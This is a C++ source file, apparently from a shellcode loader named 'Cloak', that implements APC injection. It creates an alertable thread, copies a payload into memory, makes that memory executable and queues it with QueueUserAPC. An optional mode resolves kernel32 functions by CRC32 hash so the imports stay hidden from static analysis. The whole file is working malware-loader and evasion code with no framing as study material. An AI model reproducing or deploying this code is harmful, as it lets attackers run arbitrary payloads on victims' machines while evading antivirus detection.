#include "Cloak.hpp"

#ifdef APC_INJECT

#ifdef HASH_API
#include "Hash.hpp"
#include "Defs.hpp"

VOID WaitForSingleObjectExAlertable() {
    HMODULE hKernel32 = NULL;

    if ( ( hKernel32 = LoadLibraryA( "KERNEL32.dll" ) ) == NULL ) {
        #ifdef DEBUG
        printf( "[-] LoadLibraryA Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return;
    }

    fnCreateEventA pCreateEventA = ( fnCreateEventA ) GetProcAddressH( hKernel32, CreateEventA_CRC32A );
    if ( pCreateEventA == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for CreateEventA\n" );
        #endif // !DEBUG
        
        return;
    }

    fnWaitForSingleObjectEx pWaitForSingleObjectEx = ( fnWaitForSingleObjectEx ) GetProcAddressH( hKernel32, WaitForSingleObjectEx_CRC32A );
    if ( pWaitForSingleObjectEx == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for pWaitForSingleObjectEx\n" );
        #endif // !DEBUG
        
        return;
    }

    fnCloseHandle pCloseHandle = ( fnCloseHandle ) GetProcAddressH( hKernel32, CloseHandle_CRC32A );
    if ( pCloseHandle == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for pCloseHandle\n" );
        #endif // !DEBUG
        
        return;
    }

    
    //---
    
    HANDLE hEvent = pCreateEventA( NULL, NULL, NULL, NULL );
    if ( hEvent ) {
        pWaitForSingleObjectEx( hEvent, INFINITE, TRUE );
        pCloseHandle( hEvent );
    }
}

BOOL ApcInjection( IN PBYTE pbPayload[], IN SIZE_T sPayloadSize ) {
    
    HMODULE hKernel32 = NULL;

    if ( ( hKernel32 = LoadLibraryA( "KERNEL32.dll" ) ) == NULL ) {
        #ifdef DEBUG
        printf( "[-] LoadLibraryA Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return;
    }

    fnCreateThread pCreateThread = ( fnCreateThread ) GetProcAddressH( hKernel32, CreateThread_CRC32A );
    if ( pCreateThread == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for CreateThread\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnVirtualAlloc pVirtualAlloc = ( fnVirtualAlloc ) GetProcAddressH( hKernel32, VirtualAlloc_CRC32A );
    if ( pVirtualAlloc == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for VirtualAlloc\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnVirtualProtect pVirtualProtect = ( fnVirtualProtect ) GetProcAddressH( hKernel32, VirtualProtect_CRC32A );
    if ( pVirtualProtect == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for VirtualProtect\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnQueueUserAPC pQueueUserAPC = ( fnQueueUserAPC ) GetProcAddressH( hKernel32, QueueUserAPC_CRC32A );
    if ( pQueueUserAPC == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for pQueueUserAPC\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnWaitForSingleObject pWaitForSingleObject = ( fnWaitForSingleObject ) GetProcAddressH( hKernel32, WaitForSingleObject_CRC32A );
    if ( pWaitForSingleObject == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for WaitForSingleObject\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    // ---

    HANDLE  hThread         = NULL;
    PVOID   pPayloadAddress = NULL;
    DWORD   dwOldProtect    = NULL;

    hThread = pCreateThread(NULL, NULL, ( LPTHREAD_START_ROUTINE ) &WaitForSingleObjectExAlertable, NULL, NULL, NULL);
    if ( hThread == NULL ) {
        #ifdef DEBUG
        printf( "[-] CreateThread Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    pPayloadAddress = pVirtualAlloc( NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) ;
    if ( pPayloadAddress == NULL ) {
        #ifdef DEBUG
        printf( "[-] VirtualAlloc Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    memcpy( pPayloadAddress, pbPayload, sPayloadSize );

    if ( ! pVirtualProtect( pPayloadAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtect ) ) {
        #ifdef DEBUG
        printf( "[-] VirtualProtect Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    if ( ! pQueueUserAPC( ( PAPCFUNC ) pPayloadAddress, hThread, NULL ) ) {
        #ifdef DEBUG
        printf( "[-] QueueUserAPC Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    pWaitForSingleObject(hThread, WAIT_TIME);

    return TRUE;
}

#else

VOID WaitForSingleObjectExAlertable() {
    HANDLE hEvent = CreateEvent( NULL, NULL, NULL, NULL );
    if ( hEvent ) {
        WaitForSingleObjectEx( hEvent, INFINITE, TRUE );
        CloseHandle( hEvent );
    }
}

BOOL ApcInjection( IN PBYTE pbPayload[], IN SIZE_T sPayloadSize ) {
    HANDLE  hThread         = NULL;
    PVOID   pPayloadAddress = NULL;
    DWORD   dwOldProtect    = NULL;

    hThread = CreateThread(NULL, NULL, ( LPTHREAD_START_ROUTINE ) &WaitForSingleObjectExAlertable, NULL, NULL, NULL);
    if ( hThread == NULL ) {
        #ifdef DEBUG
        printf( "[-] CreateThread Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    pPayloadAddress = VirtualAlloc( NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) ;
    if ( pPayloadAddress == NULL ) {
        #ifdef DEBUG
        printf( "[-] VirtualAlloc Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    memcpy( pPayloadAddress, pbPayload, sPayloadSize );

    if ( ! VirtualProtect( pPayloadAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtect ) ) {
        #ifdef DEBUG
        printf( "[-] VirtualProtect Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    if ( ! QueueUserAPC( ( PAPCFUNC ) pPayloadAddress, hThread, NULL ) ) {
        #ifdef DEBUG
        printf( "[-] QueueUserAPC Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    WaitForSingleObject(hThread, WAIT_TIME);

    return TRUE;
}

#endif // !HASH_API

#endif // !APC